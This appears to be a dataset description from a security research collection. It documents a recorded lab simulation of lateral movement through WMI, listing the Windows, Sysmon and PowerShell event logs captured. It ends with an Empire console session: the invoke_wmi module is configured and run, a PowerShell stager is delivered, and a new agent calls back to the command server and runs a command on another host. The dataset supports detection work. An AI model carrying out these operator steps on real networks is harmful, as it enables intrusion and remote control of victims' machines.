# Empire Invoke WMI

An adversary can use powershell to execute a stager via WMI

## Technique(s) ID

T1047

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_invoke_wmi.tar.gz](./empire_invoke_wmi.tar.gz)

## Network Environment

Shire

## Time Taken

2019-05-18214442

## About this file
 
| log_name                                   | source_name                         | task                                                   |   record_number |
|--------------------------------------------|-------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                         | PowerShell                          | Pipeline Execution Details                             |             834 |
| Windows PowerShell                         | PowerShell                          | Provider Lifecycle                                     |               6 |
| Windows PowerShell                         | PowerShell                          | Engine Lifecycle                                       |               1 |
| System                                     | Microsoft-Windows-GroupPolicy       | na                                                     |               1 |
| Security                                   | Microsoft-Windows-Security-Auditing | Filtering Platform Connection                          |             240 |
| Security                                   | Microsoft-Windows-Security-Auditing | Token Right Adjusted Events                            |             105 |
| Security                                   | Microsoft-Windows-Security-Auditing | Registry                                               |              48 |
| Security                                   | Microsoft-Windows-Security-Auditing | Sensitive Privilege Use                                |              30 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Creation                                       |              16 |
| Security                                   | Microsoft-Windows-Security-Auditing | Other Object Access Events                             |              15 |
| Security                                   | Microsoft-Windows-Security-Auditing | SAM                                                    |              14 |
| Security                                   | Microsoft-Windows-Security-Auditing | Handle Manipulation                                    |              13 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Termination                                    |              13 |
| Security                                   | Microsoft-Windows-Security-Auditing | Group Membership                                       |              10 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logon                                                  |              10 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logoff                                                 |               9 |
| Security                                   | Microsoft-Windows-Security-Auditing | Special Logon                                          |               6 |
| Security                                   | Microsoft-Windows-Security-Auditing | Authorization Policy Change                            |               4 |
| Security                                   | Microsoft-Windows-Security-Auditing | File Share                                             |               1 |
| Security                                   | Microsoft-Windows-Security-Auditing | Other Logon/Logoff Events                              |               1 |
| Microsoft-Windows-WMI-Activity/Operational | Microsoft-Windows-WMI-Activity      | na                                                     |               3 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process accessed (rule: ProcessAccess)                 |            1276 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Image loaded (rule: ImageLoad)                         |             793 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry object added or deleted (rule: RegistryEvent) |             709 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Network connection detected (rule: NetworkConnect)     |             223 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry value set (rule: RegistryEvent)               |              80 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Connected (rule: PipeEvent)                       |              29 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | RawAccessRead detected (rule: RawAccessRead)           |              21 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | File created (rule: FileCreate)                        |              18 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process Create (rule: ProcessCreate)                   |              16 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process terminated (rule: ProcessTerminate)            |              13 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Created (rule: PipeEvent)                         |               2 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Executing Pipeline                                     |             706 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | PowerShell Console Startup                             |               2 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Execute a Remote Command                               |               1 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | PowerShell Named Pipe IPC                              |               1 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Starting Command                                       |               1 |

## Attacker Activity

```
(Empire: V6W3TH8Y) > usemodule lateral_movement/invoke_wmi
(Empire: powershell/lateral_movement/invoke_wmi) > info

              Name: Invoke-WMI
            Module: powershell/lateral_movement/invoke_wmi
        NeedsAdmin: False
         OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: False
   OutputExtension: None

Authors:
  @harmj0y

Description:
  Executes a stager on remote hosts using WMI.

Options:

  Name         Required    Value                     Description
  ----         --------    -------                   -----------
  Listener     True                                  Listener to use.                        
  CredID       False                                 CredID from the store to use.           
  ComputerName True                                  Host[s] to execute the stager on, comma 
                                                     separated.                              
  Proxy        False       default                   Proxy to use for request (default, none,
                                                     or other).                              
  UserName     False                                 [domain\]username to use to execute     
                                                     command.                                
  ProxyCreds   False       default                   Proxy credentials                       
                                                     ([domain\]username:password) to use for 
                                                     request (default, none, or other).      
  UserAgent    False       default                   User-agent string to use for the staging
                                                     request (default, none, or other).      
  Password     False                                 Password to use to execute command.     
  Agent        True        V6W3TH8Y                  Agent to run module on.                 

(Empire: powershell/lateral_movement/invoke_wmi) > set Listener https
(Empire: powershell/lateral_movement/invoke_wmi) > set ComputerName IT001.shire.com
(Empire: powershell/lateral_movement/invoke_wmi) > execute
[*] Tasked V6W3TH8Y to run TASK_CMD_WAIT
[*] Agent V6W3TH8Y tasked with task ID 6
[*] Tasked agent V6W3TH8Y to run module powershell/lateral_movement/invoke_wmi
(Empire: powershell/lateral_movement/invoke_wmi) > Invoke-Wmi executed on "IT001.shire.com"
[*] Sending POWERSHELL stager (stage 1) to 10.0.10.103
[*] New agent ZLPB8CV3 checked in
[+] Initial agent ZLPB8CV3 from 10.0.10.103 now active (Slack)
[*] Sending agent (stage 2) to ZLPB8CV3 at 10.0.10.103

(Empire: powershell/lateral_movement/invoke_wmi) > agents

[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
 H3DKB8SA ps 172.18.39.106   HR001             SHIRE\nmartha           powershell         5172   5/0.0    2019-05-18 21:45:47  https           
 TKV35P8X ps 172.18.39.106   HR001             *SHIRE\nmartha          powershell         5452   5/0.0    2019-05-18 21:45:44  https           
 EMDBFPSY ps 172.18.39.106   HR001             SHIRE\nmartha           notepad            7924   5/0.0    2019-05-18 21:45:43  https           

 V6W3TH8Y ps 172.18.39.106   HR001             SHIRE\pgustavo          powershell         5204   5/0.0    2019-05-18 21:45:43  https           
 38APWSR1 ps 172.18.39.105   IT001             *SHIRE\pgustavo         MSBuild            5656   5/0.0    2019-05-18 21:45:46  https           
 ZLPB8CV3 ps 172.18.39.105   IT001             *SHIRE\pgustavo         powershell         5804   5/0.0    2019-05-18 21:45:44  https           


(Empire: agents) > interact ZLPB8CV3
(Empire: ZLPB8CV3) > shell whoami
[*] Tasked ZLPB8CV3 to run TASK_SHELL
[*] Agent ZLPB8CV3 tasked with task ID 1
(Empire: ZLPB8CV3) > shire\pgustavo
..Command execution completed.

(Empire: ZLPB8CV3) >
```